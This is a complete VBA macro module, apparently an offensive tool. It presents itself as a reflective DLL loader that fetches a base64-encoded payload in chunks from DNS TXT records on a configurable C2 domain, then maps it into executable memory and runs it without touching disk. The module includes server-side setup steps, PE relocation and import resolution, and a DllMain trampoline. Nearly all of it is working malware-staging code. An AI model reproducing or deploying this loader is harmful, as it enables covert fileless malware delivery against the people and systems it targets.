Option Explicit

' Reflective DLL Loader — retrieves a DLL via DNS TXT record queries and manually maps it in-process.
' No file is written to disk. The payload is base64-encoded and split across TXT records.
' Standalone — all declares inline. Paste into a standard module.
'
' Server-side setup:
'   1. Serve an authoritative DNS zone for C2_DOMAIN
'   2. TXT record at cnt.<C2_DOMAIN> = "<number of chunks>"
'   3. TXT record at c<N>.<C2_DOMAIN> = "<base64 chunk N>"  (N = 0, 1, 2, ...)
'   Base64 is of the full payload, split at ~200-char boundaries across records.
'   Concatenate all chunks, then base64-decode to recover the PE bytes.

' ===================== CONFIG =====================

Private Const C2_DOMAIN As String = "payload.example.com"
Private Const COUNT_LABEL As String = "cnt"
Private Const CHUNK_LABEL As String = "c"
Private Const QUERY_DELAY_MS As Long = 50
Private Const DNS_SERVER As String = "127.0.0.1"   ' custom resolver (empty = system default)

' ===================== CONSTANTS =====================

Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Const IMAGE_DOS_SIGNATURE As Integer = &H5A4D
Private Const IMAGE_NT_SIGNATURE As Long = &H4550

#If Win64 Then
    Private Const PTR_SIZE As Long = 8
    Private Const OPT_IMAGE_BASE As Long = 24
    Private Const OPT_DATA_DIR As Long = 112
    Private Const PE_MAGIC As Integer = &H20B
    Private Const DNS_REC_DATA As Long = 32
#Else
    Private Const PTR_SIZE As Long = 4
    Private Const OPT_IMAGE_BASE As Long = 28
    Private Const OPT_DATA_DIR As Long = 96
    Private Const PE_MAGIC As Integer = &H10B
    Private Const DNS_REC_DATA As Long = 24
#End If

Private Const OPT_ENTRY_POINT As Long = 16
Private Const OPT_SIZE_OF_IMAGE As Long = 56
Private Const OPT_SIZE_OF_HEADERS As Long = 60
Private Const SECTION_HEADER_SIZE As Long = 40
Private Const IMPORT_DESC_SIZE As Long = 20

Private Const DLL_PROCESS_ATTACH As Long = 1
Private Const IMAGE_REL_BASED_DIR64 As Long = 10
Private Const IMAGE_REL_BASED_HIGHLOW As Long = 3

' DNS
Private Const DNS_TYPE_TEXT As Integer = &H10
Private Const DNS_QUERY_STANDARD As Long = 0
Private Const DnsFreeRecordList As Long = 1

' Crypto
Private Const CRYPT_STRING_BASE64 As Long = 1

' ===================== DECLARES =====================

' Kernel32
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualFree Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal dwFreeType As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
Private Declare PtrSafe Function LoadLibraryAPtr Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddressPtr Lib "kernel32" Alias "GetProcAddress" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As LongPtr) As LongPtr
Private Declare PtrSafe Function NtFlushInstructionCache Lib "ntdll" ( _
    ByVal ProcessHandle As LongPtr, ByVal BaseAddress As LongPtr, _
    ByVal Length As LongPtr) As Long
Private Declare PtrSafe Function lstrlenW Lib "kernel32" (ByVal lpString As LongPtr) As Long
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)

' DNS
Private Declare PtrSafe Function DnsQuery_W Lib "dnsapi" ( _
    ByVal pszName As LongPtr, ByVal wType As Integer, _
    ByVal Options As Long, ByVal pExtra As LongPtr, _
    ByRef ppQueryResults As LongPtr, ByVal pReserved As LongPtr) As Long
Private Declare PtrSafe Sub DnsRecordListFree Lib "dnsapi" ( _
    ByVal pRecordList As LongPtr, ByVal FreeType As Long)

' Crypt32 — base64 decode
Private Declare PtrSafe Function CryptStringToBinaryW Lib "crypt32" ( _
    ByVal pszString As LongPtr, ByVal cchString As Long, ByVal dwFlags As Long, _
    ByVal pbBinary As LongPtr, ByRef pcbBinary As Long, _
    ByVal pdwSkip As LongPtr, ByVal pdwFlags As LongPtr) As Long

' User32 — trampoline for calling DllMain
Private Declare PtrSafe Function CallWindowProcW Lib "user32" ( _
    ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
    ByVal Msg As LongPtr, ByVal wParam As LongPtr, _
    ByVal lParam As LongPtr) As LongPtr

' ===================== MEMORY HELPERS =====================

Private Function RdLong(ByVal addr As LongPtr) As Long
    CopyMemory VarPtr(RdLong), addr, 4
End Function

Private Function RdWord(ByVal addr As LongPtr) As Integer
    CopyMemory VarPtr(RdWord), addr, 2
End Function

Private Function RdPtr(ByVal addr As LongPtr) As LongPtr
    CopyMemory VarPtr(RdPtr), addr, CLngPtr(PTR_SIZE)
End Function

Private Sub WrPtr(ByVal addr As LongPtr, ByVal value As LongPtr)
    CopyMemory addr, VarPtr(value), CLngPtr(PTR_SIZE)
End Sub

' ===================== DNS HELPERS =====================

Private Function ParseIPv4(ByVal ip As String) As Long
    Dim parts() As String: parts = Split(ip, ".")
    If UBound(parts) <> 3 Then Exit Function
    Dim b(0 To 3) As Byte
    Dim i As Long
    For i = 0 To 3: b(i) = CByte(parts(i)): Next
    CopyMemory VarPtr(ParseIPv4), VarPtr(b(0)), 4
End Function

Private Function QueryTXT(ByVal name As String) As String
    Dim pRecords As LongPtr
    Dim status As Long

    ' Build IP4_ARRAY for custom DNS server if configured
    ' Layout: AddrCount (Long) followed by AddrArray (Long per IP)
    Dim ip4Array(0 To 1) As Long
    Dim pExtra As LongPtr
    If Len(DNS_SERVER) > 0 Then
        ip4Array(0) = 1                      ' AddrCount = 1
        ip4Array(1) = ParseIPv4(DNS_SERVER)  ' AddrArray[0]
        pExtra = VarPtr(ip4Array(0))
    End If

    status = DnsQuery_W(StrPtr(name), DNS_TYPE_TEXT, DNS_QUERY_STANDARD, pExtra, pRecords, 0)
    If status <> 0 Then
        Debug.Print "[!] DnsQuery failed for " & name & " (status=" & status & ")"
        Exit Function
    End If
    If pRecords = 0 Then Exit Function

    ' Read dwStringCount at pRecords + DNS_REC_DATA
    Dim strCount As Long
    strCount = RdLong(pRecords + CLngPtr(DNS_REC_DATA))
    If strCount = 0 Then GoTo Cleanup

    ' Read each PWSTR from the string array at DNS_REC_DATA + PTR_SIZE
    Dim strArrayBase As LongPtr
    strArrayBase = pRecords + CLngPtr(DNS_REC_DATA) + CLngPtr(PTR_SIZE)

    Dim result As String
    Dim i As Long
    For i = 0 To strCount - 1
        Dim wstrPtr As LongPtr
        wstrPtr = RdPtr(strArrayBase + CLngPtr(i * PTR_SIZE))
        If wstrPtr = 0 Then GoTo NextStr

        Dim charLen As Long
        charLen = lstrlenW(wstrPtr)
        If charLen > 0 Then
            Dim s As String: s = Space$(charLen)
            CopyMemory StrPtr(s), wstrPtr, CLngPtr(charLen * 2)
            result = result & s
        End If
NextStr:
    Next

Cleanup:
    DnsRecordListFree pRecords, DnsFreeRecordList
    QueryTXT = result
End Function

Private Function Base64Decode(ByVal b64 As String) As Byte()
    If Len(b64) = 0 Then Exit Function

    Dim outLen As Long
    If CryptStringToBinaryW(StrPtr(b64), Len(b64), CRYPT_STRING_BASE64, 0, outLen, 0, 0) = 0 Then
        Debug.Print "[!] Base64 size query failed"
        Exit Function
    End If
    If outLen = 0 Then Exit Function

    Dim result() As Byte
    ReDim result(0 To outLen - 1)
    If CryptStringToBinaryW(StrPtr(b64), Len(b64), CRYPT_STRING_BASE64, _
                            VarPtr(result(0)), outLen, 0, 0) = 0 Then
        Debug.Print "[!] Base64 decode failed"
        Erase result
        Exit Function
    End If

    Base64Decode = result
End Function

' ===================== DNS DOWNLOAD =====================

Private Function DownloadDLL() As Byte()
    ' Query chunk count
    Dim countName As String
    countName = COUNT_LABEL & "." & C2_DOMAIN
    Dim countStr As String
    countStr = QueryTXT(countName)
    If Len(countStr) = 0 Then
        Debug.Print "[!] Failed to get chunk count from " & countName
        Exit Function
    End If

    Dim chunkCount As Long
    chunkCount = CLng(countStr)
    Debug.Print "[+] Chunk count: " & chunkCount

    If chunkCount <= 0 Then
        Debug.Print "[!] Invalid chunk count"
        Exit Function
    End If

    ' Retrieve all chunks and concatenate the base64
    Dim b64All As String
    Dim i As Long
    For i = 0 To chunkCount - 1
        Dim chunkName As String
        chunkName = CHUNK_LABEL & CStr(i) & "." & C2_DOMAIN

        Dim chunkData As String
        chunkData = QueryTXT(chunkName)
        If Len(chunkData) = 0 Then
            Debug.Print "[!] Failed to get chunk " & i & " from " & chunkName
            Exit Function
        End If

        b64All = b64All & chunkData

        If i Mod 50 = 49 Then
            Debug.Print "[*] Retrieved " & (i + 1) & "/" & chunkCount & " chunks"
        End If

        If QUERY_DELAY_MS > 0 And i < chunkCount - 1 Then Sleep QUERY_DELAY_MS
    Next
    Debug.Print "[+] Retrieved all " & chunkCount & " chunks (" & Len(b64All) & " chars base64)"

    ' Decode
    Dim pe() As Byte
    pe = Base64Decode(b64All)

    Dim sz As Long
    On Error Resume Next
    sz = UBound(pe) + 1
    On Error GoTo 0

    If sz > 0 Then
        Debug.Print "[+] Decoded " & sz & " bytes"
        DownloadDLL = pe
    Else
        Debug.Print "[!] Base64 decode produced no output"
    End If
End Function

' ===================== PE MAPPING =====================

Private Function MapAndExecute(ByRef pe() As Byte) As LongPtr
    Dim raw As LongPtr
    raw = VarPtr(pe(0))

    If RdWord(raw) <> IMAGE_DOS_SIGNATURE Then
        Debug.Print "[!] Invalid MZ signature"
        Exit Function
    End If

    Dim e_lfanew As Long
    e_lfanew = RdLong(raw + 60)

    Dim ntHdr As LongPtr
    ntHdr = raw + CLngPtr(e_lfanew)

    If RdLong(ntHdr) <> IMAGE_NT_SIGNATURE Then
        Debug.Print "[!] Invalid PE signature"
        Exit Function
    End If

    Dim fileHdr As LongPtr: fileHdr = ntHdr + 4
    Dim numSections As Integer: numSections = RdWord(fileHdr + 2)
    Dim optHdrSize As Integer: optHdrSize = RdWord(fileHdr + 16)
    Dim optHdr As LongPtr: optHdr = fileHdr + 20

    If RdWord(optHdr) <> PE_MAGIC Then
        Debug.Print "[!] PE architecture mismatch (wrong bitness)"
        Exit Function
    End If

    Dim entryPointRVA As Long: entryPointRVA = RdLong(optHdr + OPT_ENTRY_POINT)
    Dim imageBase As LongPtr: imageBase = RdPtr(optHdr + OPT_IMAGE_BASE)
    Dim sizeOfImage As Long: sizeOfImage = RdLong(optHdr + OPT_SIZE_OF_IMAGE)
    Dim sizeOfHeaders As Long: sizeOfHeaders = RdLong(optHdr + OPT_SIZE_OF_HEADERS)

    Dim importDirRVA As Long: importDirRVA = RdLong(optHdr + OPT_DATA_DIR + 8)
    Dim relocDirRVA As Long: relocDirRVA = RdLong(optHdr + OPT_DATA_DIR + 40)
    Dim relocDirSize As Long: relocDirSize = RdLong(optHdr + OPT_DATA_DIR + 44)

    Debug.Print "[*] SizeOfImage: " & sizeOfImage & "  Sections: " & numSections

    Dim allocBase As LongPtr
    allocBase = VirtualAlloc(imageBase, CLngPtr(sizeOfImage), _
                             MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If allocBase = 0 Then
        allocBase = VirtualAlloc(0, CLngPtr(sizeOfImage), _
                                 MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    End If
    If allocBase = 0 Then
        Debug.Print "[!] VirtualAlloc failed"
        Exit Function
    End If
    Debug.Print "[+] Allocated at 0x" & Hex(allocBase)

    CopyMemory allocBase, raw, CLngPtr(sizeOfHeaders)

    Dim secHdr As LongPtr
    secHdr = optHdr + CLngPtr(optHdrSize)

    Dim i As Long
    For i = 0 To numSections - 1
        Dim sh As LongPtr: sh = secHdr + CLngPtr(i * SECTION_HEADER_SIZE)
        Dim secVA As Long: secVA = RdLong(sh + 12)
        Dim secRawSz As Long: secRawSz = RdLong(sh + 16)
        Dim secRawPtr As Long: secRawPtr = RdLong(sh + 20)

        If secRawSz > 0 And secRawPtr > 0 Then
            CopyMemory allocBase + CLngPtr(secVA), raw + CLngPtr(secRawPtr), CLngPtr(secRawSz)
        End If
    Next
    Debug.Print "[+] " & numSections & " sections mapped"

    Dim delta As LongPtr
    delta = allocBase - imageBase

    If delta <> 0 And relocDirRVA <> 0 And relocDirSize <> 0 Then
        ProcessRelocations allocBase, CLngPtr(relocDirRVA), CLngPtr(relocDirSize), delta
        Debug.Print "[+] Relocations applied (delta=0x" & Hex(delta) & ")"
    End If

    If importDirRVA <> 0 Then
        ProcessImports allocBase, CLngPtr(importDirRVA)
        Debug.Print "[+] Imports resolved"
    End If

    NtFlushInstructionCache -1, allocBase, CLngPtr(sizeOfImage)

    Dim ep As LongPtr
    ep = allocBase + CLngPtr(entryPointRVA)
    Debug.Print "[*] Calling entry point at 0x" & Hex(ep)

    CallWindowProcW ep, allocBase, DLL_PROCESS_ATTACH, 0, 0

    Debug.Print "[+] DllMain returned"
    MapAndExecute = allocBase
End Function

' ===================== RELOCATIONS =====================

Private Sub ProcessRelocations(ByVal base As LongPtr, ByVal relocRVA As LongPtr, _
                                ByVal relocSize As LongPtr, ByVal delta As LongPtr)
    Dim block As LongPtr: block = base + relocRVA
    Dim blockEnd As LongPtr: blockEnd = block + relocSize

    Do While block < blockEnd
        Dim blockVA As Long: blockVA = RdLong(block)
        Dim blockSz As Long: blockSz = RdLong(block + 4)
        If blockSz = 0 Then Exit Do

        Dim numEntries As Long
        numEntries = (blockSz - 8) \ 2

        Dim j As Long
        For j = 0 To numEntries - 1
            Dim lo As Byte, hi As Byte
            CopyMemory VarPtr(lo), block + 8 + CLngPtr(j * 2), 1
            CopyMemory VarPtr(hi), block + 8 + CLngPtr(j * 2) + 1, 1

            Dim rType As Long: rType = (CLng(hi) \ 16) And &HF
            Dim rOffset As Long: rOffset = CLng(lo) Or ((CLng(hi) And &HF) * 256)

            Dim target As LongPtr
            target = base + CLngPtr(blockVA) + CLngPtr(rOffset)

            Select Case rType
                Case IMAGE_REL_BASED_DIR64
                    Dim val64 As LongPtr: val64 = RdPtr(target)
                    WrPtr target, val64 + delta

                Case IMAGE_REL_BASED_HIGHLOW
                    Dim val32 As Long: val32 = RdLong(target)
                    Dim newVal As Long
                    newVal = val32 + CLng(delta And &HFFFFFFFF)
                    CopyMemory target, VarPtr(newVal), 4

                Case 0
            End Select
        Next

        block = block + CLngPtr(blockSz)
    Loop
End Sub

' ===================== IMPORTS =====================

Private Sub ProcessImports(ByVal base As LongPtr, ByVal importRVA As LongPtr)
    Dim desc As LongPtr: desc = base + importRVA

    Do
        Dim nameRVA As Long: nameRVA = RdLong(desc + 12)
        If nameRVA = 0 Then Exit Do

        Dim hMod As LongPtr
        hMod = LoadLibraryAPtr(base + CLngPtr(nameRVA))
        If hMod = 0 Then GoTo NextDesc

        Dim origThunkRVA As Long: origThunkRVA = RdLong(desc)
        Dim thunkRVA As Long: thunkRVA = RdLong(desc + 16)

        Dim intPtr As LongPtr
        If origThunkRVA <> 0 Then
            intPtr = base + CLngPtr(origThunkRVA)
        Else
            intPtr = base + CLngPtr(thunkRVA)
        End If

        Dim iatPtr As LongPtr: iatPtr = base + CLngPtr(thunkRVA)

        Do
            Dim thunkVal As LongPtr: thunkVal = RdPtr(intPtr)
            If thunkVal = 0 Then Exit Do

            Dim funcAddr As LongPtr
            Dim hiByte As Byte
            CopyMemory VarPtr(hiByte), intPtr + CLngPtr(PTR_SIZE - 1), 1

            If (hiByte And &H80) <> 0 Then
                funcAddr = GetProcAddressPtr(hMod, thunkVal And CLngPtr(&HFFFF&))
            Else
                Dim hintNameRVA As Long: hintNameRVA = RdLong(intPtr)
                funcAddr = GetProcAddressPtr(hMod, base + CLngPtr(hintNameRVA) + 2)
            End If

            WrPtr iatPtr, funcAddr

            intPtr = intPtr + CLngPtr(PTR_SIZE)
            iatPtr = iatPtr + CLngPtr(PTR_SIZE)
        Loop

NextDesc:
        desc = desc + IMPORT_DESC_SIZE
    Loop
End Sub

' ===================== ENTRY POINT =====================

Public Sub Run()
    Debug.Print "=== Reflective DLL Loader (DNS) ==="
    Debug.Print "[*] Domain: " & C2_DOMAIN

    Dim pe() As Byte
    pe = DownloadDLL()

    Dim sz As Long
    On Error Resume Next
    sz = UBound(pe) + 1
    On Error GoTo 0

    If sz = 0 Then
        MsgBox "Download failed — is the DNS server running?", vbExclamation
        Exit Sub
    End If

    Dim baseAddr As LongPtr
    baseAddr = MapAndExecute(pe)

    If baseAddr = 0 Then
        MsgBox "Mapping failed — check Immediate Window (Ctrl+G)", vbExclamation
    Else
        Debug.Print "[+] DLL mapped at 0x" & Hex(baseAddr)
    End If

    Debug.Print "=== Done ==="
End Sub
